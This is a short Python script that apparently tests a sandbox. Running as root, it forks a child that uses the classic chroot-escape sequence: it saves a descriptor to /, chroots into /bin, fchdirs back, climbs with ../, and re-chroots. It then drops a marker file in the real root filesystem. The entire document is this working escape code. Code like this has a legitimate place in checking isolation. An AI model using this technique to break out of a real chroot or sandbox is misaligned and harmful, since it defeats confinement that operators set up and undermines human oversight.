import os
import sys

# This will escape a chroot and add touch a file in the real root, while still
# completing normally.

if os.geteuid() == 0:
    pid = os.fork()
    if pid == 0:
        print("forked")
        r = os.open("/", 0)
        os.chroot("/bin")
        os.fchdir(r)
        os.chdir("../../../../../../")
        os.chroot(".")
        open("/trivial-chroot-escape", "w")
        print("complete")
        sys.exit(0)
    else:
        os.waitpid(pid, 0)
